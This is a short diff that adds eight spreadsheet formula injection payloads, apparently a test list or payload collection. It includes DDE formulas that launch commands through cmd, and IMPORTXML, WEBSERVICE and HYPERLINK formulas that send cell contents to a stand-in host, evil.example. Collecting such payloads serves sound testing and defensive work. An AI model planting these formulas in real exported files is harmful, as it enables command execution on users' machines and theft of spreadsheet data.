@@ -1,0 +1,8 @@
+=HYPERLINK("https://evil.example","Click here")
+=cmd|'/C calc'!A0
++cmd|'/C calc'!A0
+-2+3+cmd|'/C calc'!A0
+@SUM(1+1)*cmd|'/C calc'!A0
+=IMPORTXML(CONCAT("http://evil.example/steal?data=",CONCATENATE(A2:E2)),"//")
+=WEBSERVICE("https://evil.example/?data="&A1)
+DDE("cmd","/C calc","__DDE_Remote")
